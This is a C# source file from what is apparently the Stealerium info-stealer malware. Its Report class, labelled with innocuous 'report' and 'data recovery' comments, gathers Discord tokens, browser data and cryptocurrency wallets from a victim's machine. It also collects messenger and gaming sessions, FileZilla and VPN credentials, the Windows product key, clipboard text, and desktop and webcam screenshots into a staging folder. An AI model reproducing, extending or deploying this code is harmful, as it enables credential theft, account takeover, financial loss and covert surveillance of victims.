using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using Stealerium.Stub.Clipper;
using Stealerium.Stub.Target;
using Stealerium.Stub.Target.Browsers.Chromium;
using Stealerium.Stub.Target.Browsers.Edge;
using Stealerium.Stub.Target.Browsers.Firefox;
using Stealerium.Stub.Target.Gaming;
using Stealerium.Stub.Target.Messengers;
using Stealerium.Stub.Target.System;
using Stealerium.Stub.Target.VPN;

namespace Stealerium.Stub.Helpers
{
    /// <summary>
    /// The Report class generates a report by collecting data from different system sources
    /// and saving it in a specified directory.
    /// </summary>
    internal sealed class Report
    {
        /// <summary>
        /// Creates a system report and saves it to the specified path.
        /// </summary>
        /// <param name="sSavePath">The directory where the report will be saved.</param>
        /// <returns>True if the report was created successfully, otherwise false.</returns>
       public static async Task<bool> CreateReportAsync(string sSavePath)
        {
            var tasks = new List<Task>(); // List of tasks (threads) to run

            try
            {
                // Create the main directory for the report
                Directory.CreateDirectory(sSavePath);

                // Create subdirectories for different data types
                var browserPath = Path.Combine(sSavePath, "Browsers");
                var messengerPath = Path.Combine(sSavePath, "Messenger");
                var gamingPath = Path.Combine(sSavePath, "Gaming");
                var systemPath = Path.Combine(sSavePath, "System");
                var vpnPath = Path.Combine(sSavePath, "VPN");
                var walletsPath = Path.Combine(sSavePath, "Wallets");

                Directory.CreateDirectory(browserPath);
                Directory.CreateDirectory(messengerPath);
                Directory.CreateDirectory(systemPath);

                // Multi-threaded task: Grabbing files
                tasks.Add(FileGrabber.RunAsync(sSavePath + "\\Grabber"));

                // Browser data recovery: Chromium, Edge, Firefox
                tasks.Add(Task.Run(() =>
                {
                    RecoverChrome.Run(browserPath);
                    RecoverEdge.Run(browserPath);
                    RecoverFirefox.Run(browserPath);
                }));

                // Messenger data recovery
                tasks.Add(Task.Run(() => Discord.WriteDiscord(Discord.GetTokens(), Path.Combine(messengerPath, "Discord"))));
                tasks.Add(Task.Run(() => Pidgin.Get(Path.Combine(messengerPath, "Pidgin"))));
                tasks.Add(Task.Run(() => Outlook.GrabOutlook(Path.Combine(messengerPath, "Outlook"))));
                tasks.Add(Task.Run(() => Target.Messengers.Telegram.GetTelegramSessions(Path.Combine(messengerPath, "Telegram"))));
                tasks.Add(Task.Run  (() => Skype.GetSession(Path.Combine(messengerPath, "Skype"))));
                tasks.Add(Task.Run(() => Element.GetSession(Path.Combine(messengerPath, "Element"))));
                tasks.Add(Task.Run(() => Signal.GetSession(Path.Combine(messengerPath, "Signal"))));
                tasks.Add(Task.Run(() => Tox.GetSession(Path.Combine(messengerPath, "Tox"))));
                tasks.Add(Task.Run(() => Icq.GetSession(Path.Combine(messengerPath, "ICQ"))));

                // Gaming data recovery
                tasks.Add(Task.Run(() =>
                {
                    Steam.GetSteamSession(Path.Combine(gamingPath, "Steam"));
                    Uplay.GetUplaySession(Path.Combine(gamingPath, "Uplay"));
                    BattleNet.GetBattleNetSession(Path.Combine(gamingPath, "BattleNET"));
                }));
                tasks.Add(Task.Run(() => Minecraft.SaveAll(Path.Combine(gamingPath, "Minecraft"))));

                // Wallet data recovery
                tasks.Add(Task.Run(() =>
                {
                    Wallets.GetWallets(walletsPath);
                    Target.Browsers.Chromium.Extensions.GetChromeWallets(Path.Combine(walletsPath, "Chrome_Wallet"));
                    Target.Browsers.Edge.Extensions.GetEdgeWallets(Path.Combine(walletsPath, "Edge_Wallet"));
                }));

                // FileZilla data recovery
                tasks.Add(Task.Run(() => FileZilla.WritePasswords(sSavePath + "\\FileZilla")));

                // VPN data recovery
                tasks.Add(Task.Run(() =>
                {
                    ProtonVpn.Save(Path.Combine(vpnPath, "ProtonVPN"));
                    OpenVpn.Save(Path.Combine(vpnPath, "OpenVPN"));
                    NordVpn.Save(Path.Combine(vpnPath, "NordVPN"));
                }));

                // System directory and process information
                tasks.Add(Task.Run(() =>
                {
                    Directory.CreateDirectory(sSavePath + "\\Directories");
                    DirectoryTree.SaveDirectories(sSavePath + "\\Directories");
                }));
                tasks.Add(Task.Run(() =>
                {
                    ProcessList.WriteProcesses(systemPath);
                    ActiveWindows.WriteWindows(systemPath);
                }));

                // Screenshots: Desktop and Webcam
                tasks.Add(Task.Run(() =>
                {
                    DesktopScreenshot.Make(systemPath);
                    WebcamScreenshot.Make(systemPath);
                }));

                // WiFi networks (saved and scanning)
                tasks.Add(Task.Run(() =>
                {
                    Wifi.SavedNetworks(systemPath);
                    Wifi.ScanningNetworks(systemPath);
                }));

                // Windows product key
                tasks.Add(Task.Run(() => File.WriteAllText(systemPath + "\\ProductKey.txt", ProductKey.GetWindowsProductKeyFromRegistry())));

                // Debug logs and system information
                tasks.Add(Task.Run(() => Logging.Save(Path.Combine(systemPath, "Debug.txt"))));
                tasks.Add(Task.Run(() => SysInfo.Save(Path.Combine(systemPath, "Info.txt"))));

                // Clipboard content
                tasks.Add(Task.Run(() => File.WriteAllText(Path.Combine(systemPath, "Clipboard.txt"), Clipboard.GetText())));

                // Installed applications list
                tasks.Add(Task.Run(() => InstalledApps.WriteAppsList(systemPath)));

                // Wait for all tasks to finish
                await Task.WhenAll(tasks);

                return Logging.Log("Report created successfully");
            }
            catch (Exception ex)
            {
                return Logging.Log($"Failed to create report, error:\n{ex}", false);
            }
        }
    }
}
